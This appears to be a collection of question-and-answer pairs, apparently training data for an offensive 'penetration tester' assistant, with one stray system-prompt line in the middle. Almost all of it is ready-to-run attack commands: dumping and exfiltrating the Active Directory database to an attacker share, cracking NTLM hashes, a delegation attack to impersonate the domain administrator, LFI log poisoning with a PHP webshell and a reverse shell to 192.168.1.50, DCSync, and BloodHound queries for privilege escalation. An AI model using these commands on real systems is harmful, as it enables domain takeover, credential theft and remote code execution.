How do I use ntdsutil IFM to export NTDS.dit from a domain controller and parse all NTLM hashes?

ntdsutil IFM (Install From Media) creates an offline copy of AD — legitimate admin tool, less suspicious.

On DC (cmd as SYSTEM/Admin):
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\NTDS" q q

Creates:
  C:\Temp\NTDS\Active Directory\ntds.dit
  C:\Temp\NTDS\registry\SYSTEM
  C:\Temp\NTDS\registry\SECURITY

Compress and exfil:
cd C:\Temp && tar -czf ntds_ifm.tar.gz NTDS
# Or use PowerShell: Compress-Archive -Path NTDS -DestinationPath ntds_ifm.zip

Transfer to attacker (SMB):
copy ntds_ifm.tar.gz \\192.168.1.50\share\ntds_ifm.tar.gz

Parse on attacker Linux:
tar -xzf ntds_ifm.tar.gz
python3 /opt/impacket/examples/secretsdump.py \
  -ntds 'Active Directory/ntds.dit' \
  -system registry/SYSTEM \
  -security registry/SECURITY \
  LOCAL -outputfile all_domain_hashes

NTLM-only fast extract:
python3 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -just-dc-ntlm | tee ntlm_only.txt

Crack:
hashcat -m 1000 ntlm_only.txt /usr/share/wordlists/rockyou.txt --force -O
hashcat -m 1000 ntlm_only.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 ntlm_only.txt /usr/share/wordlists/rockyou.txt -a 3 '?u?l?l?l?d?d?d?d'

How do I perform a Resource-Based Constrained Delegation (RBCD) attack against VICTIM.CORP.LOCAL to impersonate the domain administrator?

RBCD requires write access to target's msDS-AllowedToActOnBehalfOfOtherIdentity.

Step 1 — Create attacker machine account (MAQ default = 10):
python3 /opt/impacket/examples/addcomputer.py -computer-name 'ATTACKPC$' -computer-pass 'Attack123!' -dc-ip 192.168.1.10 corp.local/jsmith:'Password123!'

Step 2 — Write RBCD (ATTACKPC$ can delegate to VICTIM$):
python3 /opt/impacket/examples/rbcd.py -f 'ATTACKPC' -t 'VICTIM' -dc-ip 192.168.1.10 corp.local/jsmith:'Password123!' -action write

Step 3 — Request service ticket impersonating administrator:
python3 /opt/impacket/examples/getST.py -spn cifs/victim.corp.local -impersonate administrator -dc-ip 192.168.1.10 corp.local/'ATTACKPC$':'Attack123!'

Step 4 — Use the ticket:
export KRB5CCNAME='administrator@cifs_victim.corp.local@CORP.LOCAL.ccache'
python3 /opt/impacket/examples/secretsdump.py -k -no-pass corp.local/administrator@victim.corp.local
python3 /opt/impacket/examples/psexec.py -k -no-pass corp.local/administrator@victim.corp.local

Verify RBCD attribute was written:
python3 /opt/impacket/examples/rbcd.py -t 'VICTIM' -dc-ip 192.168.1.10 corp.local/jsmith:'Password123!' -action read

Cleanup:
python3 /opt/impacket/examples/rbcd.py -t 'VICTIM' -dc-ip 192.168.1.10 corp.local/jsmith:'Password123!' -action remove -f 'ATTACKPC'
You are an expert penetration tester.
How do I exploit LFI via Apache log poisoning to achieve remote code execution?

Log poisoning abuses LFI to include a PHP-poisoned log file.

Step 1 — Confirm LFI:
http://target.com/page.php?file=../../../../etc/passwd
http://target.com/page.php?file=....//....//....//etc/passwd  (bypass ../ filter)
http://target.com/page.php?file=%2F%2F%2F%2Fetc%2Fpasswd  (URL-encoded)

Step 2 — Confirm log file is accessible:
http://target.com/page.php?file=../../../../var/log/apache2/access.log
http://target.com/page.php?file=../../../../var/log/nginx/access.log
http://target.com/page.php?file=../../../../var/log/auth.log

Step 3 — Poison the User-Agent with PHP code:
curl -s http://target.com/ -A '<?php system($_GET["cmd"]); ?>'

Step 4 — Trigger RCE:
http://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=id
http://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=whoami

Step 5 — Get a reverse shell:
Encode to avoid breakage in URL:
http://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.1.50/4444+0>%261'

SSH auth.log poisoning (inject PHP via invalid SSH username):
ssh '<?php system($_GET["cmd"]); ?>'@target.com
http://target.com/page.php?file=../../../../var/log/auth.log&cmd=id

/proc/self/environ poisoning:
curl -s http://target.com/ -A '<?php system($_GET["c"]); ?>'
http://target.com/page.php?file=/proc/self/environ&c=id

How do I perform a DCSync attack with secretsdump.py against CORP.LOCAL at 192.168.1.10?

DCSync mimics DC replication to pull all password hashes without touching LSASS.
Requires: Domain Admin, or an account with GetChanges + GetChangesAll on the domain object.

Dump all hashes (NTLM + Kerberos keys):
python3 /opt/impacket/examples/secretsdump.py corp.local/administrator:'Password123!'@192.168.1.10 -just-dc

Dump NTLM hashes only (faster):
python3 /opt/impacket/examples/secretsdump.py corp.local/administrator:'Password123!'@192.168.1.10 -just-dc-ntlm

Dump single user (e.g., krbtgt for golden ticket):
python3 /opt/impacket/examples/secretsdump.py corp.local/administrator:'Password123!'@192.168.1.10 -just-dc-user krbtgt

With Kerberos ticket:
export KRB5CCNAME=administrator.ccache
python3 /opt/impacket/examples/secretsdump.py -k -no-pass corp.local/administrator@dc01.corp.local

Output format: username:RID:LMHASH:NTHASH:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:36f7a3ebaa54935ecf03678635a695c4:::
administrator:500:aad3b435b51404eeaad3b435b51404ee:fc87c4b6e5e66f0aff96e0b3b6ba741e:::

Save output:
python3 secretsdump.py corp.local/administrator:'Password123!'@192.168.1.10 -just-dc-ntlm -outputfile domain_hashes

What are the most useful BloodHound Cypher queries for finding privilege escalation paths in CORP.LOCAL?

Paste these in BloodHound's Raw Query box:

Shortest path from owned users to DA:
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) WHERE u.owned=true RETURN p

All Kerberoastable enabled users:
MATCH (u:User {hasspn:true,enabled:true}) RETURN u.name, u.serviceprincipalnames ORDER BY u.name

AS-REP roastable users:
MATCH (u:User {dontreqpreauth:true,enabled:true}) RETURN u.name

Computers where DA sessions exist:
MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}) RETURN c.name, u.name

Unconstrained delegation computers (non-DC):
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name STARTS WITH 'DC' RETURN c.name

ACL paths from jsmith to high-value targets:
MATCH p=shortestPath((u:User {name:'JSMITH@CORP.LOCAL'})-[:GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights*1..]->(n)) WHERE n:Group OR n:User OR n:Computer RETURN p

Users with DCSync rights:
MATCH (n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN n.name, labels(n)

LAPS-protected computers:
MATCH (c:Computer {haslaps:true}) RETURN c.name

Find computers with local admin paths:
MATCH p=(u:User {name:'JSMITH@CORP.LOCAL'})-[:AdminTo|MemberOf*..]->(c:Computer) RETURN p
